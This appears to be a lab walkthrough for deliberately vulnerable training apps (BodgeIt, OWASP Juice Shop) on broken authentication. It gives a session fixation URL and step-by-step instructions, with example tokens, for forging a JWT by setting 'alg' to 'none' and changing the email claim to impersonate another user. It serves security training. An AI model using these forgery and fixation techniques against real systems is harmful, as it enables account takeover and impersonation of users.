# A2 - Broken Authentication and Session Management

## Session fixation

`http://bodgeit.lab/bodgeit/login.jsp?JSESSIONID=0CE01A16F33AC52D89705BC9A088E0AF`

## JWT

**JuiceShop**

* Log in as any user to receive a valid JWT in the `Authorization` header.
* Copy the JWT (i.e. everything after `Bearer` in the `Authorization` header) and decode it.
* Under the `payload` property, change the `email` attribute in the JSON to `jwtn3d@juice-sh.op`.
* Change the value of the `alg` property in the header part from `HS256` to `none`.
* Encode the header to `base64url`. Similarly, encode the payload to `base64url`. `base64url` makes it URL safe, a regular `Base64` encode might not work!
* Join the two strings obtained above with a `.` (dot symbol) and add a `.` at the end of the obtained string. So, effectively it becomes `base64url(header).base64url(payload).`
* Change the `Authorization` header of a subsequent request to the retrieved JWT (prefixed with `Bearer` as before) and submit the request. Alternatively you can set the `token` cookie to the JWT which be used to populate any future request with that header.

You will start with something like this:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTcsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJwZW50ZXN0QGNpdGFkZWxvLmNvbSIsInBhc3N3b3JkIjoiNmEyODQxNTU5MDZjMjZjYmNhMjBjNTMzNzZiYzYzYWMiLCJyb2xlIjoiY3VzdG9tZXIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiJkZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMC0xMS0wMiAxMzo0Mjo0OC41MzUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMC0xMS0wMiAxMzo0Mjo0OC41MzUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjA0MzI0NTgwLCJleHAiOjE2MDQzNDI1ODB9.Je66KESQrX5RP729cztb3YKDa6NeLSPcXRO9VtIun6Zs5GFgLvG7uU0QLyBY-JFimH0cEQF06uyz7r7uHCL3FOXc3pGf4pv7YqHs3kp6DsigLAhdZFLwwmX4MxdCdQTmZdnQsUoeVGMTSS4p1uy-i37bofvs97IvWHRhNQmPeqs
```

And finish with something like this:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTcsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJqd3RuM2RAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjZhMjg0MTU1OTA2YzI2Y2JjYTIwYzUzMzc2YmM2M2FjIiwicm9sZSI6ImN1c3RvbWVyIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjAtMTEtMDIgMTM6NDI6NDguNTM1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjAtMTEtMDIgMTM6NDI6NDguNTM1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTYwNDMyNDU4MCwiZXhwIjoxNjA0MzQyNTgwfQ.
```
